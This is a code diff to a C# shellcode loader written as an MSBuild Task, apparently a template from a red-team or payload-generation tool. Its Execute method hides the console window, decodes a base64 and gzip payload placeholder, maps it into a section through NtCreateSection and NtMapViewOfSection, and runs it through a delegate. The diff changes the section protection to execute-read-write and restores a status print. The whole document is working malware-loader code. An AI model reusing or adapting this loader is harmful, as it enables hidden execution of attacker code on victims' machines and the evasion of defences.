@@ -11,8 +11,6 @@ using System.Security.Cryptography;
 
 public class ClassRunner : Task, ITask
 {
-    private static UInt32 MEM_COMMIT = 0x1000;
-    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
     [StructLayout(LayoutKind.Sequential)]
     public struct SECT_DATA
     {
@@ -26,10 +24,7 @@ public class ClassRunner : Task, ITask
 
     public override bool Execute()
     {
-        IntPtr handle=GetConsoleWindow();
-        const int SW_HIDE = 0;
-        const int SW_SHOW = 5;
-        ShowWindow(handle, SW_HIDE);
+        ShowWindow(GetConsoleWindow(), 0);
 
         byte[] encShellcode = Convert.FromBase64String("{{.Payload}}");
         byte[] rawShellcode = { };
@@ -47,7 +42,7 @@ public class ClassRunner : Task, ITask
         rawShellcode = Gzip.Decompress(rawShellcode);
 
         // Create local section, map two views RW + RX, copy shellcode to RW
-        ////Console.WriteLine("\n[>] Creating local section..");
+        Console.WriteLine("\n[>] Creating local section..");
         SECT_DATA LocalSect = MapLocalSectionAndWrite(rawShellcode);
 
         Console.WriteLine("\n[>] Triggering shellcode using delegate!");
@@ -72,7 +67,7 @@ public class ClassRunner : Task, ITask
         long ScSize = ShellCode.Length;
         long MaxSize = ScSize;
         IntPtr hSection = IntPtr.Zero;
-        UInt32 CallResult = NtCreateSection(ref hSection, 0xe, IntPtr.Zero, ref MaxSize, 0x04, 0x8000000, IntPtr.Zero);
+        UInt32 CallResult = NtCreateSection(ref hSection, 0xe, IntPtr.Zero, ref MaxSize, 0x40, 0x8000000, IntPtr.Zero);
         if (CallResult == 0 && hSection != IntPtr.Zero)
         {
             //Console.WriteLine("    |-> hSection: 0x" + String.Format("{0:X}", (hSection).ToInt64()));
@@ -89,7 +84,7 @@ public class ClassRunner : Task, ITask
         // Allocate RW portion + Copy ShellCode
         IntPtr pScBase = IntPtr.Zero;
         long lSecOffset = 0;
-        CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x20, 0, 0x04);
+        CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x04);
         if (CallResult == 0 && pScBase != IntPtr.Zero)
         {
             //Console.WriteLine("\n[>] Creating first view with PAGE_READWRITE");
